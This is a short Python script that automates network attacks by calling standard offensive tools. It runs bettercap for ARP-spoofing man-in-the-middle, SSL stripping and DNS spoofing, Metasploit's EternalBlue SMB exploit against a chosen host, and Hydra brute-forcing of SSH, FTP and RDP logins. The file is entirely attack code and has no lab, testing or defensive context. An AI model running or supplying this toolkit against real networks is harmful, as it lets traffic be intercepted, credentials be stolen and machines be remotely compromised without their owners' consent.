import subprocess
import time

def start_mitm_arp_spoof(target_ip, gateway_ip):
    """Starts an ARP spoofing attack to perform MITM on the target device."""
    try:
        print(f"Starting ARP spoofing on target {target_ip} via gateway {gateway_ip}...")
        subprocess.run(["sudo", "bettercap", "-T", target_ip, "--gateway", gateway_ip, "-X"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to start ARP spoofing: {e}")

def ssl_strip():
    """Enables SSL stripping to downgrade HTTPS traffic to HTTP."""
    try:
        print("Enabling SSL stripping with Bettercap...")
        subprocess.run(["sudo", "bettercap", "-eval", "set http.proxy.sslstrip true; http.proxy on;"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to enable SSL stripping: {e}")

def smb_exploit(target_ip):
    """Attempts SMB-based exploits on the target IP if SMB vulnerabilities are detected."""
    try:
        print(f"Attempting SMB exploit on target {target_ip}...")
        # Example command for Metasploit SMB exploit, customize as needed
        subprocess.run(["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; run;"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to perform SMB exploit: {e}")

def brute_force_service(target_ip, service, username, password_list):
    """Performs brute-force attack on specified service using Hydra."""
    try:
        print(f"Starting brute-force attack on {service} at {target_ip}...")
        service_port = {
            "ssh": 22,
            "ftp": 21,
            "rdp": 3389
        }.get(service)

        if service_port:
            subprocess.run(["hydra", "-l", username, "-P", password_list, f"{service}://{target_ip}:{service_port}"], check=True)
        else:
            print("Service not supported for brute-forcing.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to brute-force {service}: {e}")

def dns_spoof(target_domain, redirect_ip):
    """Spoofs DNS requests for a specific domain to redirect to the specified IP."""
    try:
        print(f"Starting DNS spoofing for domain {target_domain}...")
        subprocess.run(["sudo", "bettercap", "-eval", f"set dns.spoof.domains {target_domain}; set dns.spoof.address {redirect_ip}; dns.spoof on"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to start DNS spoofing: {e}")
